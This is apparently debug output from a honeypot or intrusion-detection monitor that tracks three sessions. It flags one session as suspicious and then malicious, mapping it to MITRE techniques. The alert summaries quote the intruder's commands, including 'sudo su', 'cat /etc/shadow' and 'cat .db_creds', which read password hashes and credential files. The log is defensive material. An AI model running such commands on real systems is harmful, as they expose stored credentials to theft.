+[DEBUG] Checking session 16c2f697f636. Current events: 15, Previous: 15
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 16, Previous: 15
+[DEBUG] New events detected for session 16c2f697f636. Processing...
+[*] Logged SUSPICIOUS event for session 16c2f697f636 to suspicious_activity.log
+
+==================================================
+ADAPTIVE INTELLIGENCE FOR SESSION: 16c2f697f636
+Detected Level : 2 (SUSPICIOUS)
+Intent         : System Discovery
+Skill Level    : Intermediate
+Attack Stage   : Reconnaissance
+RAG Mapping    : File and Directory Discovery (T1083)
+Summary        : The user executed a command sequence ('ls', 'sudo su', 'whoami', 'pwd', 'cat etc/shadow', 'cat /etc/shadow', 'ls', '') that matches File and Directory Discovery (T1083) behavior, triggering detections: Privilege Escalation Attempt, System Discovery (Reconnaissance).
+Status         : Policy Updated for Live Session
+==================================================
+
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 16, Previous: 16
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 16, Previous: 16
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 16, Previous: 16
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 16, Previous: 16
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 16, Previous: 16
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 16, Previous: 16
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 16
+[DEBUG] New events detected for session 16c2f697f636. Processing...
+[*] Logged MALICIOUS event for session 16c2f697f636 to malicious_alerts.log
+
+==================================================
+ADAPTIVE INTELLIGENCE FOR SESSION: 16c2f697f636
+Detected Level : 3 (MALICIOUS)
+Intent         : System Discovery
+Skill Level    : Intermediate
+Attack Stage   : Reconnaissance
+RAG Mapping    : Unsecured Credentials (T1552)
+Summary        : The user executed a command sequence ('ls', 'sudo su', 'whoami', 'pwd', 'cat etc/shadow', 'cat /etc/shadow', 'ls', '', 'cat .db_creds') that matches Unsecured Credentials (T1552) behavior, triggering detections: Privilege Escalation Attempt, System Discovery (Reconnaissance).
+Status         : Policy Updated for Live Session
+==================================================
+
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
